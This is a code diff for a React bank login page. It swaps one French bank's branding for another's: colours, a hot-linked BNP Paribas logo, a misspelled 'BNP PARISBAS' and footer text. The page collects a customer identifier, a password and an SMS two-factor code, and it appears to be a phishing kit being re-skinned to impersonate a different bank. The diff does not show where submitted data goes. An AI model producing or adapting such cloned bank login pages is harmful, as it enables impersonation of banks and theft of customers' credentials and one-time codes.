@@ -46,8 +46,8 @@ function IndicateurCode({ longueur, total }: { longueur: number; total: number }
 key={i}
 className="w-4 h-4 rounded-full border-2 transition-all"
 style={{
-  background: i < longueur ? '#E30613' : 'white',
-  borderColor: i < longueur ? '#E30613' : '#d1d5db',
+  background: i < longueur ? '#00915A' : 'white',
+  borderColor: i < longueur ? '#00915A' : '#d1d5db',
           }}
         />
       ))}
@@ -60,7 +60,7 @@ function PanneauDroit() {
     <div
       className="hidden lg:flex flex-col justify-between p-12 text-white relative overflow-hidden"
       style={{
-        background: 'linear-gradient(135deg, #164194 0%, #1e56b3 50%, #2f6dd4 100%)',
+        background: 'linear-gradient(135deg, #00915A 0%, #00b36b 50%, #00d98c 100%)',
       }}
     >
       {/* Cercles décoratifs */}
@@ -71,8 +71,8 @@ function PanneauDroit() {
 
       <div className="relative z-10">
         <h2 className="text-3xl font-bold leading-tight mb-3">
-          credit mutuel,{' '}
-          <span style={{ color: '#E30613' }}>citoyenne</span>
+          BNP PARISBAS,{' '}
+          <span style={{ color: '#00915A' }}>citoyenne</span>
         </h2>
         <p className="text-blue-100 text-sm leading-relaxed max-w-xs">
           Parce que nous croyons qu'une banque doit agir pour la
@@ -170,16 +170,13 @@ export default function LoginPage() {
       {/* Header logo */}
       <div className="mb-8">
         <div className="flex items-center gap-2 mb-1">
-        <p className='w-20 h-20'><img src="https://www.pagesjaunes.fr/media/agc/76/21/2e/00/00/3a/c3/f7/51/d7/697b76212e00003ac3f751d7/697b76212e00003ac3f751d8.jpg" alt="" /></p>
-          <span className="font-bold text-gray-900 text-lg tracking-tight">
-            CREDIT MUTUEL
-          </span>
+        <p className='w-50 h-20'><img src="https://cdn.cookielaw.org/logos/716f7201-def5-41ba-bb74-b0904c984cda/c98d49f2-96d8-45ee-80d3-504c1f465a9d/4a3f9402-0260-40a8-84db-79716607ba60/BNPP_H_RVB.jpg" alt="" /></p>
         </div>
       </div>
       {children}
       {/* Footer */}
       <p className="text-xs text-gray-400 mt-8 text-center lg:text-left">
-        Credit Mutuel · SA a Directoire et Conseil de Surveillance
+        BNP PARISBAS · SA a Directoire et Conseil de Surveillance
       </p>
     </div>
   )
@@ -195,9 +192,9 @@ export default function LoginPage() {
               Code envoye par SMS au +33 7 xx xx xx 03
             </p>
           </div>
-          <div className="flex items-center gap-2 bg-blue-50 border border-blue-100 rounded-lg px-3 py-2 mb-5">
-            <Shield size={15} className="text-[#164194] flex-shrink-0" />
-            <p className="text-xs text-[#164194]">
+          <div className="flex items-center gap-2 bg-green-100 border border-green-200 rounded-lg px-3 py-2 mb-5">
+            <Shield size={15} className="text-[#00915A] flex-shrink-0" />
+            <p className="text-xs text-[#00915A]">
               Saisissez le code recu par SMS
             </p>
           </div>
@@ -213,7 +210,7 @@ export default function LoginPage() {
                 placeholder="• • • • • •"
                 value={code2fa}
                 onChange={(e) => setCode2fa(e.target.value.replace(/\D/g, ''))}
-                className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-center text-2xl font-mono tracking-widest focus:outline-none focus:border-[#003189] transition-colors"
+                className="w-full border-2 border-gray-200 rounded-lg px-4 py-3 text-center text-2xl font-mono tracking-widest focus:outline-none focus:border-[#00915A] transition-colors"
               />
             </div>
             {error && (
@@ -225,7 +222,7 @@ export default function LoginPage() {
               type="submit"
               disabled={code2fa.length !== 6 || loading}
               className="w-full text-white font-semibold py-3 rounded-lg transition-colors disabled:opacity-50"
-              style={{ background: '#164194' }}
+              style={{ background: '#00915A' }}
             >
               {loading ? 'Verification...' : 'Valider'}
             </button>
@@ -288,7 +285,7 @@ export default function LoginPage() {
             onClick={handlePassword}
             disabled={password.length !== 6 || loading}
             className="w-full mt-4 text-white font-semibold py-3 rounded-lg transition-colors disabled:opacity-50"
-            style={{ background: '#164194' }}
+            style={{ background: '#00915A' }}
           >
             {loading ? 'Connexion...' : 'Se connecter'}
           </button>
@@ -297,7 +294,7 @@ export default function LoginPage() {
             type="button"
             onClick={() => { setEtape('identifiant'); setPassword(''); setError('') }}
             className="w-full text-sm text-center mt-3"
-            style={{ color: '#164194' }}
+            style={{ color: '#00915A' }}
           >
             Mot de passe oublie ?
           </button>
@@ -366,7 +363,7 @@ export default function LoginPage() {
             type="submit"
             disabled={identifiant.length !== 10}
             className="w-full text-white font-semibold py-3 rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-            style={{ background: '#164194' }}
+            style={{ background: '#00915A' }}
           >
             Continuer
           </button>
